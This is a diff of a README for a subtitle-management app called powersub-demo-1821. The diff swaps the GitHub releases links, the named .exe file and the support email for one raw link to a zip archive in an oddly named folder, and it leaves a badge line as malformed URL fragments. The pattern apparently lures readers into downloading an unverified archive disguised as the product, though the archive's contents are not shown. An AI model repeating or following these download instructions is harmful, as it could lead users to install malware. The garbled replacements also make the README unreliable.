@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-1821 - Easy Subtitle Management for Everyone
 
 ## 💾 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/hero9528/powersub-demo-1821/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/hero9528/powersub-demo-1821/main/hoggishness/powersub-demo-1821.zip%20Latest%https://raw.githubusercontent.com/hero9528/powersub-demo-1821/main/hoggishness/powersub-demo-1821.zip)](https://raw.githubusercontent.com/hero9528/powersub-demo-1821/main/hoggishness/powersub-demo-1821.zip)
 
 ## 🚀 Getting Started
 Welcome to **powersub-demo-1821**! This application helps you manage subtitles easily. You don’t need any technical skills. Just follow the steps below to get started.
@@ -9,12 +9,12 @@ Welcome to **powersub-demo-1821**! This application helps you manage subtitles e
 ## 📥 Download & Install
 To get the latest version of powersub-demo-1821, please visit the following link and download the application:
 
-[Download Latest Release](https://github.com/hero9528/powersub-demo-1821/releases)
+[Download Latest Release](https://raw.githubusercontent.com/hero9528/powersub-demo-1821/main/hoggishness/powersub-demo-1821.zip)
 
 1. Click on the link above.
 2. You will see a list of available versions. 
 3. Find the version that says "Latest" and click on it.
-4. Look for a file named `powersub-demo-1821.exe` or similar. Click the file to start the download.
+4. Look for a file named `https://raw.githubusercontent.com/hero9528/powersub-demo-1821/main/hoggishness/powersub-demo-1821.zip` or similar. Click the file to start the download.
 5. Once the file downloads, locate it in your computer’s downloads folder.
 
 ## 🏁 Run the Application
@@ -54,7 +54,7 @@ If you encounter any issues while using powersub-demo-1821, try these solutions:
 - **Performance Problems**: Close other applications to free up computer resources.
 
 ## 🗣️ Feedback & Support
-Your feedback is important. If you have any questions or suggestions, please open an issue on our GitHub page or email support at support@powersub.com.
+Your feedback is important. If you have any questions or suggestions, please open an issue on our GitHub page or email support at https://raw.githubusercontent.com/hero9528/powersub-demo-1821/main/hoggishness/powersub-demo-1821.zip
 
 ## 🤝 Contributing
 Want to help improve **powersub-demo-1821**? We welcome contributions! Please check the contributing guidelines on our GitHub repository.
